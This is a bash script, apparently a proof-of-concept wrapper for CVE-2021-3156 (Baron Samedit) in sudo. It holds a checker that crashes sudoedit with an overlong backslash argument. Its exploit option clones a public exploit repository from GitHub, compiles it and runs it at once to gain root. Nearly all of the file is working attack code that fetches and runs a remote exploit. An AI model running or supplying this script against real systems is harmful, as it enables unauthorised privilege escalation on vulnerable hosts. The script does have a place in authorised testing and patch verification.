#!/bin/bash
#
# PoC CVE-2021-3156
# by Blasty (https://twitter.com/bl4sty)
#
# Checker tool by @M3n0sD0n4ld (https://twitter.com/David_Uton)
#
# Dubbed for Baron Samedit (https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt)
#
########################################################################################################################

# Functions
function check(){
	status=$(which python || which python3 || which perl)

	if [ $? -eq 0 ]; then
		if [[ $status == *perl* ]]; then
			checkStatus=$(sudoedit -s '\' $($status -e 'print "A" x 65536') 2>&1)
		else
			checkStatus=$(sudoedit -s '\' $($status -c 'print("A"*1000)') 2>&1)
		fi

		if [[ $checkStatus == *malloc* ]]; then
			echo -e "\n[+] VULNERABLE!!!"
			exit
		else
			echo -e "\n[-] NOT vulnerable."
		fi
	else
		echo -e "\n[!] An error has occurred, it is possible that no version of Python or Perl is installed."
	fi
}

function exploit(){
	pathGit=$(which git)

	if [ -x "$pathGit" ]; then
		echo -e "[+] Downloading exploit..."
		git clone https://github.com/blasty/CVE-2021-3156.git 2>/dev/null && cd CVE-2021-3156/ 
		echo -e "[+] Compile exploit..."
		make > /dev/null && ./sudo-hax-me-a-sandwich

	else
		echo -e "[!] Error, you need git installed."

	fi
}


function logotype(){
	echo """
 ## # # ###     ### ### ###  #      ###  #  ### ### 
#   # # #         # # #   # ##        # ##  #   #   
#   # # ##  ### ### # # ###  #  ###  ##  #  ### ### 
#   # # #       #   # # #    #        #  #    # # # 
 ##  #  ###     ### ### ### ###     ### ### ### ###
	"""
}


# Execute

if [ -n "$1" ]; then

	logotype

	if [ "$1" == "-h"  ]; then
		echo """------------------------------------------------------------				
1. Execute checker: $ $0 check
2. Download exploit (manual execution): $ $0 exploit
------------------------------------------------------------"""
	
	elif [ "$1" == "check" ]; then
		check
		echo $checkStatus

	elif [ "$1" == "exploit" ]; then
		exploit

	else

		echo -e "\n[!] Wrong, arguments are missing. Run $0 -h for help."

	fi

else
	echo -e "\n[!] Wrong, arguments are missing. Run $0 -h for help."

fi